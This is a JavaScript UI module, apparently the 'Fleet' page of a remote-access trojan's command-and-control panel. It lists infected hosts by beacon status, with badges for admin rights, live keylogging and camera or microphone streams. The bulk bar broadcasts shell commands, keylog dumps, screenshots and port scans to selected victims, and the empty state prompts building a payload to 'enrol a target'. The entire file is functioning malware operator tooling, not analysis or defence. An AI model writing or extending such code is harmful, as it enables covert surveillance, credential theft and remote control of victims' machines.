/* Fleet: every host, grouped by derived presence. */

import * as store from '../store.js';
import { href, go } from '../router.js';
import { ico, toast, download } from '../ui.js';
import { api } from '../api.js';
import { ago, beaconProgress, esc, initials, presence, STATE_LABEL, isWin, clip, osLabel } from '../format.js';

const CHIPS = [['all', 'All'], ['online', 'Online'], ['idle', 'Idle'], ['stale', 'Stale'], ['offline', 'Offline']];
const BULK = [
  ['shell', 'Shell command'], ['ls', 'List a path'], ['ps', 'Process list'],
  ['sysinfo', 'Sysinfo'], ['screenshot', 'Screenshot'], ['keylog', 'Keylog dump'],
  ['netstat', 'Sockets'], ['scan', 'Network scan'],
];

export const fleet = {
  mount(root, route, ctx) {
    ctx.ids = () => store.visible().map((s) => s.id);
    root.innerHTML = `
      <div class="toolbar">
        <div class="search">${ico('i-search')}
          <input class="inp" id="fq" placeholder="Filter host, user, OS, address, tag…"
            value="${esc(store.state.filters.q)}" autocomplete="off"></div>
        <div class="chips" id="fchips">${CHIPS.map(([k, l]) =>
          `<button class="chip" data-st="${k}">${l}<span class="n"></span></button>`).join('')}</div>
        <div class="spacer"></div>
        <select class="inp sm" id="fsort" style="width:152px" aria-label="Sort">
          <option value="state">Sort: presence</option>
          <option value="seen">Sort: last seen</option>
          <option value="host">Sort: hostname</option>
          <option value="user">Sort: user</option>
          <option value="os">Sort: platform</option>
          <option value="ip">Sort: address</option>
        </select>
        <button class="btn ghost sm" id="fexport">${ico('i-down')} Export</button>
      </div>
      <div class="page" style="padding-top:14px">
        <div class="scroll-x"><table class="tbl">
          <thead><tr>
            <th style="width:30px"><input class="chk" id="fall" type="checkbox" aria-label="Select all visible"></th>
            <th>Host</th><th>Operator</th><th>Platform</th><th>Address</th>
            <th>State</th><th>Last beacon</th><th>Window</th><th></th>
          </tr></thead>
          <tbody id="fbody"></tbody>
        </table></div>
      </div>
      <div id="fbulk"></div>`;

    root.querySelector('#fq').oninput = (e) => store.setFilter({ q: e.target.value });
    root.querySelector('#fsort').value = store.state.sort;
    root.querySelector('#fsort').onchange = (e) => { store.state.sort = e.target.value; store.emit(); };
    root.querySelector('#fchips').onclick = (e) => {
      const b = e.target.closest('[data-st]');
      if (b) store.setFilter({ state: b.dataset.st });
    };
    root.querySelector('#fall').onchange = (e) => {
      store.state.checked.clear();
      if (e.target.checked) ctx.ids().forEach((id) => store.state.checked.add(id));
      store.emit();
    };
    root.querySelector('#fexport').onclick = () => {
      const rows = store.visible().map((s) => ({
        host: s.host?.hostname, user: s.host?.user, os: s.host?.os, arch: s.host?.arch,
        address: s.remote, presence: presence(s), elevated: !!s.host?.elevated,
        last_seen: new Date((s.last_seen || 0) * 1000).toISOString(), tags: s.tags, note: s.note,
      }));
      download('phantom-fleet.json', JSON.stringify(rows, null, 2), 'application/json');
    };

    const body = root.querySelector('#fbody');
    body.onclick = (e) => {
      const row = e.target.closest('tr[data-id]');
      if (!row) return;
      const act = e.target.closest('[data-act]')?.dataset.act;
      if (act === 'pick') { store.toggleCheck(row.dataset.id, !store.state.checked.has(row.dataset.id)); return; }
      if (act === 'keylog') { go(href.host(row.dataset.id, 'keylog')); return; }
      if (act === 'term') { go(href.host(row.dataset.id, 'console')); return; }
      go(href.host(row.dataset.id));
    };
    this.paint(root, route, ctx);
  },

  update(root, route, ctx) { this.paint(root, route, ctx); },

  paint(root, route, ctx) {
    const list = store.visible();
    const counts = store.counts();
    root.querySelectorAll('[data-st]').forEach((b) => {
      const k = b.dataset.st;
      b.classList.toggle('on', store.state.filters.state === k);
      b.classList.toggle('warn', k === 'idle');
      b.classList.toggle('bad', k === 'offline');
      b.querySelector('.n').textContent = k === 'all' ? counts.total : counts[k] || 0;
    });

    const body = root.querySelector('#fbody');
    if (!list.length) {
      body.innerHTML = `<tr><td colspan="9"><div class="empty">${ico('i-fleet')}
        <b>No host matches</b><span>Loosen the filters, or build a payload to enrol a target.</span>
        <a class="btn sm" href="${href.payloads()}">${ico('i-box')} Build payload</a></div></td></tr>`;
      this.bulk(root, ctx);
      return;
    }

    let group = '';
    body.innerHTML = list.map((s) => {
      const st = s.presence;
      const head = st !== group ? `<tr class="group"><td colspan="9">${STATE_LABEL[st]} · ${counts[st]}</td></tr>` : '';
      group = st;
      return head + this.row(s, route);
    }).join('');

    root.querySelectorAll('.jchk').forEach((c) => {
      c.onchange = (e) => {
        e.stopPropagation();
        store.toggleCheck(e.target.closest('tr').dataset.id, e.target.checked);
      };
    });
    root.querySelector('#fall').checked = list.length > 0 && list.every((s) => store.state.checked.has(s.id));
    this.bulk(root, ctx);
  },

  bulk(root, ctx) {
    const box = root.querySelector('#fbulk');
    const n = store.state.checked.size;
    if (!n) { box.innerHTML = ''; return; }
    box.innerHTML = `<div class="bulkbar">
      <b>${n}</b><span class="muted">selected</span>
      <select class="inp sm" id="bktype" style="width:150px">
        ${BULK.map(([v, l]) => `<option value="${v}">${l}</option>`).join('')}
      </select>
      <input class="inp sm mono" id="bkarg" placeholder="argument (path, command…)" style="max-width:320px">
      <button class="btn sm primary" id="bkgo">${ico('i-bolt')} Run on selection</button>
      <button class="btn sm ghost" id="bkclear">Clear</button></div>`;

    const run = async () => {
      const type = box.querySelector('#bktype').value;
      const raw = box.querySelector('#bkarg').value.trim();
      const args = type === 'shell' ? { cmd: raw }
        : type === 'ls' ? { path: raw || '.' }
          : type === 'keylog' ? { sub: 'dump' }
            : type === 'scan' ? { subnet: raw, ports: '22,80,443,445,3389,8080' } : {};
      const ids = [...store.state.checked];
      const r = await api.broadcast(ids, type, args);
      toast(`queued on ${r.issued} host${r.issued === 1 ? '' : 's'}`);
      store.log('queue', `broadcast ${type} → ${r.issued} host(s)`);
    };
    box.querySelector('#bkgo').onclick = run;
    box.querySelector('#bkarg').onkeydown = (e) => { if (e.key === 'Enter') run(); };
    box.querySelector('#bkclear').onclick = () => { store.state.checked.clear(); store.emit(); };
    box.querySelector('#bktype').onchange = (e) => {
      box.querySelector('#bkarg').placeholder = e.target.value === 'shell' ? 'command…'
        : e.target.value === 'ls' ? 'path (default .)' : 'optional argument';
    };
  },

  row(s, route) {
    const st = s.presence;
    const checked = store.state.checked.has(s.id);
    const win = isWin(s);
    return `<tr data-id="${s.id}" class="click ${route.id === s.id ? 'sel' : ''}">
      <td><input class="chk jchk" type="checkbox" ${checked ? 'checked' : ''} aria-label="Select ${esc(s.host?.hostname || '')}"></td>
      <td><div class="host-cell">
        <span class="avatar ${st}">${esc(initials(s))}</span>
        <span class="host-id">
          <span class="nm">${esc(s.host?.hostname || 'unknown')}
            ${s.host?.elevated ? `<span class="badge amber" title="elevated">${ico('i-shield')}admin</span>` : ''}
            ${s.keylog?.on ? '<span class="badge mint">keys</span>' : ''}
            ${s.streams?.cam ? '<span class="badge violet">cam</span>' : ''}
            ${s.streams?.mic ? '<span class="badge violet">mic</span>' : ''}
            ${s.queued ? `<span class="badge blue">${s.queued} queued</span>` : ''}
          </span>
          <span class="sub">${esc(clip(s.note || s.id, 46))}</span>
        </span></div></td>
      <td class="mono dim">${esc(s.host?.user || '—')}</td>
      <td><span class="badge ${win ? 'blue' : ''}">${esc(clip(osLabel(s), 20))}</span>
        <span class="dim tiny"> ${esc(s.host?.arch || '')}</span></td>
      <td class="mono dim">${esc(s.remote || s.host?.ip || '—')}</td>
      <td><span class="row tiny"><span class="dot ${st}"></span>${STATE_LABEL[st]}</span></td>
      <td class="age ${st === 'online' ? 'hot' : st === 'idle' ? 'warm' : 'dim'}">${ago(s.last_seen, store.state.now)}</td>
      <td class="next"><div class="bar ${st === 'idle' ? 'amber' : st === 'offline' ? 'red' : ''}">
        <i style="width:${st === 'online' ? Math.round(beaconProgress(s, store.state.now) * 100) : 100}%"></i></div></td>
      <td><div class="actions">
        <button class="btn ghost sm ico-only" data-act="keylog" title="Keylogger">${ico('i-key')}</button>
        <button class="btn ghost sm ico-only" data-act="term" title="Console">${ico('i-term')}</button>
        <button class="btn ghost sm ico-only" data-act="pick" title="Select">${ico('i-check')}</button>
        <button class="btn ghost sm ico-only" data-act="open" title="Open workspace">${ico('i-chev')}</button>
      </div></td>
    </tr>`;
  },
};
